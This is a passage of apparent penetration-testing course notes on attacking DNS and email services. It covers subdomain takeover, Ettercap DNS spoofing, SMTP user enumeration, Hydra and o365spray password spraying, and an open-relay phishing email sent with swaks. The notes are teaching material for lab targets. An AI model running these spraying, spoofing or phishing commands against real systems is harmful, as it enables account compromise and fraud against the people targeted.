'\"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI\"',\n <DNS name _sip._tcp>: '_sip._tcp 14000 IN SRV 0 0 5060 www',\n <DNS name 14.105.196.5.IN-ADDR.ARPA>: '14.105.196.5.IN-ADDR.ARPA 7200 IN PTR '\n                                       'www',\n <DNS name asfdbauthdns>: 'asfdbauthdns 7900 IN AFSDB 1 asfdbbox',\n <DNS name asfdbbox>: 'asfdbbox 7200 IN A 127.0.0.1',\n <DNS name asfdbvolume>: 'asfdbvolume 7800 IN AFSDB 1 asfdbbox',\n <DNS name canberra-office>: 'canberra-office 7200 IN A 202.14.81.230',\n <DNS name cmdexec>: 'cmdexec 300 IN TXT \"; ls\"',\n <DNS name contact>: 'contact 2592000 IN TXT \"Remember to call or email Pippa '\n                     'on +44 123 4567890 or pippa@zonetransfer.me when making '\n                     'DNS changes\"',\n <DNS name dc-office>: 'dc-office 7200 IN A 143.228.181.132',\n <DNS name deadbeef>: 'deadbeef 7201 IN AAAA dead:beaf::',\n <DNS name dr>: 'dr 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m',\n <DNS name DZC>: 'DZC 7200 IN TXT \"AbCdEfG\"',\n <DNS name email>: 'email 2222 IN NAPTR 1 1 \"P\" \"E2U+email\" \"\" '\n                   'email.zonetransfer.me\\n'\n                   'email 7200 IN A 74.125.206.26',\n <DNS name Hello>: 'Hello 7200 IN TXT \"Hi to Josh and all his class\"',\n <DNS name home>: 'home 7200 IN A 127.0.0.1',\n <DNS name Info>: 'Info 7200 IN TXT \"ZoneTransfer.me service provided by Robin '\n                  'Wood - robin@digi.ninja. See '\n                  'http://digi.ninja/projects/zonetransferme.php for more '\n                  'information.\"',\n <DNS name internal>: 'internal 300 IN NS intns1\\ninternal 300 IN NS intns2',\n <DNS name intns1>: 'intns1 300 IN A 81.4.108.41',\n <DNS name intns2>: 'intns2 300 IN A 167.88.42.94',\n <DNS name office>: 'office 7200 IN A 4.23.39.254',\n <DNS name ipv6actnow.org>: 'ipv6actnow.org 7200 IN AAAA '\n                            '2001:67c:2e8:11::c100:1332',\n...SNIP...\n```\n\n---\n\n## Domain Takeovers & Subdomain Enumeration\n\n`Domain takeover` is registering a non-existent domain name to gain control over another domain. If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain.\n\nDomain takeover is also possible with subdomains called `subdomain takeover`. A DNS's canonical name (`CNAME`) record is used to map different domains to a parent domain. Many organizations use third-party services like AWS, GitHub, Akamai, Fastly, and other content delivery networks (CDNs) to host their content. In this case, they usually create a subdomain and make it point to those services. For example,\n\nAttacking DNS\n\n```shell-session\nsub.target.com.   60   IN   CNAME   anotherdomain.com\n```\n\nThe domain name (e.g., `sub.target.com`) uses a CNAME record to another domain (e.g., `anotherdomain.com`). Suppose the `anotherdomain.com` expires and is available for anyone to claim the domain since the `target.com`'s DNS server has the `CNAME` record. In that case, anyone who registers `anotherdomain.com` will have complete control over `sub.target.com` until the DNS record is updated.\n\n#### Subdomain Enumeration\n\nBefore performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like [Subfinder](https://github.com/projectdiscovery/subfinder). This tool can scrape subdomains from open sources like [DNSdumpster](https://dnsdumpster.com/). Other tools like [Sublist3r](https://github.com/aboul3la/Sublist3r) can also be used to brute-force subdomains by supplying a pre-generated wordlist:\n\nAttacking DNS\n\n```shell-session\ndrxh3kr@htb[/htb]# ./subfinder -d inlanefreight.com -v       \n                                                                       \n        _     __ _         _                                           \n____  _| |__ / _(_)_ _  __| |___ _ _          \n(_-< || | '_ \\  _| | ' \\/ _  / -_) '_|                 \n/__/\\_,_|_.__/_| |_|_||_\\__,_\\___|_| v2.4.5                                                                                                                                                                                                                                                 \n                projectdiscovery.io                    \n                                                                       \n[WRN] Use with caution. You are responsible for your actions\n[WRN] Developers assume no liability and are not responsible for any misuse or damage.\n[WRN] By using subfinder, you also agree to the terms of the APIs used. \n                                   \n[INF] Enumerating subdomains for inlanefreight.com\n[alienvault] www.inlanefreight.com\n[dnsdumpster] ns1.inlanefreight.com\n[dnsdumpster] ns2.inlanefreight.com\n...snip...\n[bufferover] Source took 2.193235338s for enumeration\nns2.inlanefreight.com\nwww.inlanefreight.com\nns1.inlanefreight.com\nsupport.inlanefreight.com\n[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds\n```\n\nAn excellent alternative is a tool called [Subbrute](https://github.com/TheRook/subbrute). This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.\n\n#### Subbrute\n\nAttacking DNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1\ndrxh3kr@htb[/htb]$ cd subbrute\ndrxh3kr@htb[/htb]$ echo \"ns1.inlanefreight.com\" > ./resolvers.txt\ndrxh3kr@htb[/htb]$ ./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt\n\nWarning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.\ninlanefreight.com\nns2.inlanefreight.com\nwww.inlanefreight.com\nms1.inlanefreight.com\nsupport.inlanefreight.com\n\n<SNIP>\n```\n\nSometimes internal physical configurations are poorly secured, which we can exploit to upload our tools from a USB stick. Another scenario would be that we have reached an internal host through pivoting and want to work from there. Of course, there are other alternatives, but it does not hurt to know alternative ways and possibilities.\n\nThe tool has found four subdomains associated with `inlanefreight.com`. Using the `nslookup` or `host` command, we can enumerate the `CNAME` records for those subdomains.\n\nAttacking DNS\n\n```shell-session\ndrxh3kr@htb[/htb]# host support.inlanefreight.com\n\nsupport.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com\n```\n\nThe `support` subdomain has an alias record pointing to an AWS S3 bucket. However, the URL `https://support.inlanefreight.com` shows a `NoSuchBucket` error indicating that the subdomain is potentially vulnerable to a subdomain takeover. Now, we can take over the subdomain by creating an AWS S3 bucket with the same subdomain name.\n\n![XML error: NoSuchBucket. Message: The specified bucket 'inlanefreight' does not exist. Includes RequestId and HostId.](https://academy.hackthebox.com/storage/modules/116/s3.png)\n\nThe [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) repository is also an excellent reference for a subdomain takeover vulnerability. It shows whether the target services are vulnerable to a subdomain takeover and provides guidelines on assessing the vulnerability.\n\n---\n\n## DNS Spoofing\n\nDNS spoofing is also referred to as DNS Cache Poisoning. This attack involves altering legitimate DNS records with false information so that they can be used to redirect online traffic to a fraudulent website. Example attack paths for the DNS Cache Poisoning are as follows:\n\n- An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (`MITM`) attack.\n    \n- Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.\n    \n\n#### Local DNS Cache Poisoning\n\nFrom a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/).\n\nTo exploit the DNS cache poisoning via `Ettercap`, we should first edit the `/etc/ettercap/etter.dns` file to map the target domain name (e.g., `inlanefreight.com`) that they want to spoof and the attacker's IP address (e.g., `192.168.225.110`) that they want to redirect a user to:\n\nAttacking DNS\n\n```shell-session\ndrxh3kr@htb[/htb]# cat /etc/ettercap/etter.dns\n\ninlanefreight.com      A   192.168.225.110\n*.inlanefreight.com    A   192.168.225.110\n```\n\nNext, start the `Ettercap` tool and scan for live hosts within the network by navigating to `Hosts > Scan for Hosts`. Once completed, add the target IP address (e.g., `192.168.152.129`) to Target1 and add a default gateway IP (e.g., `192.168.152.2`) to Target2.\n\n![Ettercap interface showing host list with IP and MAC addresses. Highlighted entry: IP 192.168.152.129, MAC 00:0C:29:A7:9D:13. Options to delete or add host to targets.](https://academy.hackthebox.com/storage/modules/116/target.png)\n\nActivate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`. This sends the target machine with fake DNS responses that will resolve `inlanefreight.com` to IP address `192.168.225.110`:\n\n![Ettercap plugins list showing dns_spoof version 1.3, highlighted. Info: Sends spoofed DNS replies. Host 192.168.152.129 added to TARGET1.](https://academy.hackthebox.com/storage/modules/116/etter_plug.png)\n\nAfter a successful DNS spoof attack, if a victim user coming from the target machine `192.168.152.129` visits the `inlanefreight.com` domain on a web browser, they will be redirected to a `Fake page` that is hosted on IP address `192.168.225.110`:\n\n![Browser window displaying URL 'http://inlanefreight.com/' with text 'Fake page' on a blank webpage](https://academy.hackthebox.com/storage/modules/116/etter_site.png)\n\nIn addition, a ping coming from the target IP address `192.168.152.129` to `inlanefreight.com` should be resolved to `192.168.225.110` as well:\n\nAttacking DNS\n\n```cmd-session\nC:\\>ping inlanefreight.com\n\nPinging inlanefreight.com [192.168.225.110] with 32 bytes of data:\nReply from 192.168.225.110: bytes=32 time<1ms TTL=64\nReply from 192.168.225.110: bytes=32 time<1ms TTL=64\nReply from 192.168.225.110: bytes=32 time<1ms TTL=64\nReply from 192.168.225.110: bytes=32 time<1ms TTL=64\n\nPing statistics for 192.168.225.110:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n```\n\nThese are a few examples of common DNS attacks. There are other more advanced attacks that will be covered in later modules.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/14- Latest DNS Vulnerabilities",
    "path": "02_CPTS/10-Attacking Common Services/14- Latest DNS Vulnerabilities.md",
    "title": "14  Latest DNS Vulnerabilities",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- We can find thousands of subdomains and domains on the web. Often they point to no longer active third-party service providers such as AWS, GitHub, and others and, at best, display an error messag...",
    "category": "02_CPTS",
    "content": "\n---\n\nWe can find thousands of subdomains and domains on the web. Often they point to no longer active third-party service providers such as AWS, GitHub, and others and, at best, display an error message as confirmation of a deactivated third-party service. Large companies and corporations are also affected time and again. Companies often cancel services from third-party providers but forget to delete the associated DNS records. This is because no additional costs are incurred for a DNS entry. Many well-known bug bounty platforms, such as [HackerOne](https://www.hackerone.com/), already explicitly list `Subdomain Takeover` as a bounty category. With a simple search, we can find several tools on GitHub, for example, that automate the discovery of vulnerable subdomains or help create Proof of Concepts (`PoC`) that can then be submitted to the bug bounty program of our choice or the affected company. RedHuntLabs did a [study](https://redhuntlabs.com/blog/project-resonance-wave-1.html) on this in 2020, and they found that over 400,000 subdomains out of 220 million were vulnerable to subdomain takeover. 62% of them belonged to the e-commerce sector.\n\n#### RedHuntLabs Study\n\n![Infographic on subdomain takeover: 33 third-party services prone to vulnerability, 220 million domains studied, 424,120 possible takeovers identified, 139 in Alexa Top 1000.](https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png) Source: https://redhuntlabs.com/blog/project-resonance-wave-1.html\n\n---\n\n## The Concept of the Attack\n\nOne of the biggest dangers of a subdomain takeover is that a phishing campaign can be launched that is considered part of the official domain of the target company. For example, customers would look at the link and see that the domain `customer-drive.inlanefreight.com` (which points to a nonexisting S3 bucket from AWS) is behind the official domain `inlanefreight.com` and trust it as a customer. However, the customers do not know that this page has been mirrored or created by an attacker to provoke a login by the company's customers, for example.\n\nTherefore, if an attacker finds a `CNAME` record in the company's DNS records that points to a subdomain that no longer exists and returns an `HTTP 404 error`, this subdomain can most likely be taken over by us through the use of the third-party provider. A subdomain takeover occurs when a subdomain points to another domain using the CNAME record that does not currently exist. When an attacker registers this nonexistent domain, the subdomain points to the domain registration by us. By making a single DNS change, we make ourselves the owner of that particular subdomain, and after that, we can manage the subdomain as we choose.\n\n#### The Concept of Attacks\n\n![Flowchart with stages: Source (Code, Libraries, Config, APIs, User Input), Processes (PID, Input, Data processing, Variables, Logging), Privileges (System, User, Groups, Policies, Rules), Destination (Local: Files, Process; Network: Interface, Network Address, Route).](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)\n\nWhat happens here is that the existing subdomain no longer points to a third-party provider and is therefore no longer occupied by this provider. Pretty much anyone can register this subdomain as their own. Visiting this subdomain and the presence of the CNAME record in the company's DNS leads, in most cases, to things working as expected. However, the design and function of this subdomain are in the hands of the attacker.\n\n#### Initiation of Subdomain Takeover\n\n|**Step**|**Subdomain Takeover**|**Concept of Attacks - Category**|\n|---|---|---|\n|`1.`|The source, in this case, is the subdomain name that is no longer used by the company that we discovered.|`Source`|\n|`2.`|The registration of this subdomain on the third-party provider's site is done by registering and linking to own sources.|`Process`|\n|`3.`|Here, the privileges lie with the primary domain owner and its entries in its DNS servers. In most cases, the third-party provider is not responsible for whether this subdomain is accessible via others.|`Privileges`|\n|`4.`|The successful registration and linking are done on our server, which is the destination in this case.|`Destination`|\n\nThis is when the cycle starts all over again, but this time to trigger the forwarding to the server we control.\n\n#### Trigger the Forwarding\n\n|**Step**|**Subdomain Takeover**|**Concept of Attacks - Category**|\n|---|---|---|\n|`5.`|The visitor of the subdomain enters the URL in his browser, and the outdated DNS record (CNAME) that has not been removed is used as the source.|`Source`|\n|`6.`|The DNS server looks in its list to see if it has knowledge about this subdomain and if so, the user is redirected to the corresponding subdomain (which is controlled by us).|`Process`|\n|`7.`|The privileges for this already lie with the administrators who manage the domain, as only they are authorized to change the domain and its DNS servers. Since this subdomain is in the list, the DNS server considers the subdomain as trustworthy and forwards the visitor.|`Privileges`|\n|`8.`|The destination here is the person who requests the IP address of the subdomain where they want to be forwarded via the network.|`Destination`|\n\nSubdomain takeover can be used not only for phishing but also for many other attacks. These include, for example, stealing cookies, cross-site request forgery (CSRF), abusing CORS, and defeating content security policy (CSP). We can see some examples of subdomain takeovers on the [HackerOne website](https://hackerone.com/hacktivity?querystring=%22subdomain%20takeover%22), which have earned the bug bounty hunters considerable payouts.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/15- Attacking Email Services",
    "path": "02_CPTS/10-Attacking Common Services/15- Attacking Email Services.md",
    "title": "15  Attacking Email Services",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- A mail server (sometimes also referred to as an email server) is a server that handles and delivers email over a network, usually over the Internet. A mail server can receive emails from a client ...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nA `mail server` (sometimes also referred to as an email server) is a server that handles and delivers email over a network, usually over the Internet. A mail server can receive emails from a client device and send them to other mail servers. A mail server can also deliver emails to a client device. A client is usually the device where we read our emails (computers, smartphones, etc.).\n\nWhen we press the `Send` button in our email application (email client), the program establishes a connection to an `SMTP` server on the network or Internet. The name `SMTP` stands for Simple Mail Transfer Protocol, and it is a protocol for delivering emails from clients to servers and from servers to other servers.\n\nWhen we download emails to our email application, it will connect to a `POP3` or `IMAP4` server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.\n\nBy default, `POP3` clients remove downloaded messages from the email server. This behavior makes it difficult to access email on multiple devices since downloaded messages are stored on the local computer. However, we can typically configure a `POP3` client to keep copies of downloaded messages on the server.\n\nOn the other hand, by default, `IMAP4` clients do not remove downloaded messages from the email server. This behavior makes it easy to access email messages from multiple devices. Let's see how we can target mail servers.\n\n![Diagram of email flow: 1. Email sent from a computer via SMTP to a server. 2. Server forwards email via SMTP to another server. 3. Email retrieved by another computer via IMAP.](https://academy.hackthebox.com/storage/modules/116/SMTP-IMAP-1.png)\n\n---\n\n## Enumeration\n\nEmail servers are complex and usually require us to enumerate multiple servers, ports, and services. Furthermore, today most companies have their email services in the cloud with services such as [Microsoft 365](https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook) or [G-Suite](https://workspace.google.com/solutions/new-business/). Therefore, our approach to attacking the email service depends on the service in use.\n\nWe can use the `Mail eXchanger` (`MX`) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.\n\nWe can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:\n\n#### Host - MX Records\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ host -t MX hackthebox.eu\n\nhackthebox.eu mail is handled by 1 aspmx.l.google.com.\n```\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ host -t MX microsoft.com\n\nmicrosoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.\n```\n\n#### DIG - MX Records\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig mx plaintext.do | grep \"MX\" | grep -v \";\"\n\nplaintext.do.           7076    IN      MX      50 mx3.zoho.com.\nplaintext.do.           7076    IN      MX      10 mx.zoho.com.\nplaintext.do.           7076    IN      MX      20 mx2.zoho.com.\n```\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig mx inlanefreight.com | grep \"MX\" | grep -v \";\"\n\ninlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.\n```\n\n#### Host - A Records\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ host -t A mail1.inlanefreight.htb.\n\nmail1.inlanefreight.htb has address 10.129.14.128\n```\n\nThese `MX` records indicate that the first three mail services are using a cloud services G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com), and Zoho (mx.zoho.com), and the last one may be a custom mail server hosted by the company.\n\nThis information is essential because the enumeration methods may differ from one service to another. For example, most cloud service providers use their mail server implementation and adopt modern authentication, which opens new and unique attack vectors for each service provider. On the other hand, if the company configures the service, we could uncover bad practices and misconfigurations that allow common attacks on mail server protocols.\n\nIf we are targetting a custom mail server implementation such as `inlanefreight.htb`, we can enumerate the following ports:\n\n|**Port**|**Service**|\n|---|---|\n|`TCP/25`|SMTP Unencrypted|\n|`TCP/143`|IMAP4 Unencrypted|\n|`TCP/110`|POP3 Unencrypted|\n|`TCP/465`|SMTP Encrypted|\n|`TCP/587`|SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)|\n|`TCP/993`|IMAP4 Encrypted|\n|`TCP/995`|POP3 Encrypted|\n\nWe can use `Nmap`'s default script `-sC` option to enumerate those ports on the target system:\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00025s latency).\n\nPORT   STATE SERVICE VERSION\n25/tcp open  smtp    Postfix smtpd\n|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, \nMAC Address: 00:00:00:00:00:00 (VMware)\n```\n\n---\n\n## Misconfigurations\n\nEmail services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.\n\n#### Authentication\n\nThe SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.\n\n`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.\n\n#### VRFY Command\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ telnet 10.10.110.20 25\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n220 parrot ESMTP Postfix (Debian/GNU)\n\n\nVRFY root\n\n252 2.0.0 root\n\n\nVRFY www-data\n\n252 2.0.0 www-data\n\n\nVRFY new-user\n\n550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table\n```\n\n`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as \"all.\"\n\n#### EXPN Command\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ telnet 10.10.110.20 25\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n220 parrot ESMTP Postfix (Debian/GNU)\n\n\nEXPN john\n\n250 2.1.0 john@inlanefreight.htb\n\n\nEXPN support-team\n\n250 2.0.0 carol@inlanefreight.htb\n250 2.1.5 elisa@inlanefreight.htb\n```\n\n`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.\n\n#### RCPT TO Command\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ telnet 10.10.110.20 25\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n220 parrot ESMTP Postfix (Debian/GNU)\n\n\nMAIL FROM:test@htb.com\nit is\n250 2.1.0 test@htb.com... Sender ok\n\n\nRCPT TO:julio\n\n550 5.1.1 julio... User unknown\n\n\nRCPT TO:kate\n\n550 5.1.1 kate... User unknown\n\n\nRCPT TO:john\n\n250 2.1.5 john... Recipient ok\n```\n\nWe can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.\n\n#### USER Command\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ telnet 10.10.110.20 110\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n+OK POP3 Server ready\n\nUSER julio\n\n-ERR\n\n\nUSER john\n\n+OK\n```\n\nTo automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7\n\nStarting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )\n\n ----------------------------------------------------------\n|                   Scan Information                       |\n ----------------------------------------------------------\n\nMode ..................... RCPT\nWorker Processes ......... 5\nUsernames file ........... userlist.txt\nTarget count ............. 1\nUsername count ........... 78\nTarget TCP port .......... 25\nQuery timeout ............ 5 secs\nTarget domain ............ inlanefreight.htb\n\n######## Scan started at Thu Apr 21 06:53:07 2022 #########\n10.129.203.7: jose@inlanefreight.htb exists\n10.129.203.7: pedro@inlanefreight.htb exists\n10.129.203.7: kate@inlanefreight.htb exists\n######## Scan completed at Thu Apr 21 06:53:18 2022 #########\n3 results.\n\n78 queries in 11 seconds (7.1 queries / sec)\n```\n\n---\n\n## Cloud Enumeration\n\nAs discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.\n\n[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Let's first validate if our target domain is using Office 365.\n\n#### O365 Spray\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz\n\n            *** O365 Spray ***            \n\n>----------------------------------------<\n\n   > version        :  2.0.4\n   > domain         :  msplaintext.xyz\n   > validate       :  True\n   > timeout        :  25 seconds\n   > start          :  2022-04-13 09:46:40\n\n>----------------------------------------<\n\n[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz\n[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz\n```\n\nNow, we can attempt to identify usernames.\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        \n                                       \n            *** O365 Spray ***             \n\n>----------------------------------------<\n\n   > version        :  2.0.4\n   > domain         :  msplaintext.xyz\n   > enum           :  True\n   > userfile       :  users.txt\n   > enum_module    :  office\n   > rate           :  10 threads\n   > timeout        :  25 seconds\n   > start          :  2022-04-13 09:48:03\n\n>----------------------------------------<\n\n[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz\n[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz\n[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users\n[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz\n[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz\n[2022-04-13 09:48:10,415] INFO : \n\n[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'\n[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'\n\n[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2\n```\n\n---\n\n## Password Attacks\n\nWe can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for `POP3`.\n\n#### Hydra - Password Attack\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3\n\nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46\n[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task\n[DATA] attacking pop3://10.10.110.20:110/\n[110][pop3] host: 10.129.42.197   login: john   password: Company01!\n1 of 1 target successfully completed, 1 valid password found\n```\n\nIf cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.\n\n#### O365 Spray - Password Spraying\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz\n\n            *** O365 Spray ***            \n\n>----------------------------------------<\n\n   > version        :  2.0.4\n   > domain         :  msplaintext.xyz\n   > spray          :  True\n   > password       :  March2022!\n   > userfile       :  usersfound.txt\n   > count          :  1 passwords/spray\n   > lockout        :  1.0 minutes\n   > spray_module   :  oauth2\n   > rate           :  10 threads\n   > safe           :  10 locked accounts\n   > timeout        :  25 seconds\n   > start          :  2022-04-14 12:26:31\n\n>----------------------------------------<\n\n[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz\n[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz\n[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.\n[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']\n[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!\n[2022-04-14 12:26:33,048] INFO : \n\n[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'\n[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'\n\n[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1\n```\n\n---\n\n## Protocol Specifics Attacks\n\nAn open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.\n\n#### Open Relay\n\nFrom an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT\nNmap scan report for 10.10.11.213\nHost is up (0.28s latency).\n\nPORT   STATE SERVICE\n25/tcp open  smtp\n|_smtp-open-relay: Server is an open relay (14/16 tests)\n```\n\nNext, we can use any mail client to connect to the mail server and send our email.\n\nAttacking Email Services\n\n```shell-session\ndrxh3kr@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213\n\n=== Trying 10.10.11.213:25...\n=== Connected to 10.10.11.213.\n<-  220 mail.localdomain SMTP Mailer ready\n -> EHLO parrot\n<-  250-mail.localdomain\n<-  250-SIZE 33554432\n<-  250-8BITMIME\n<-  250-STARTTLS\n<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1\n<-  250 HELP\n -> MAIL 